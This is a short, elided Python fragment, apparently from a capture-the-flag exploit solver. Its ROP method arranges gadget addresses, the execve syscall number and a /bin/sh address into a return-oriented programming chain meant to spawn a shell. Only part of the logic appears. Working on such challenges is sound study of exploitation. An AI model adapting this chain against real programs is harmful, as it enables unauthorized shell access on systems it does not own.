...
class Challenge:
    ...
    def ROP(self):
        ...
        target_stack = [addr1, 0xb, addr2, 0x0, -0x100000000 + self.binsh_addr, addr3, 0x0, addr4]
        n = [ target_stack[i+1] + target_stack[i] for i in range(7)] + [ target_stack[7] ]
        assert n[3] < 0
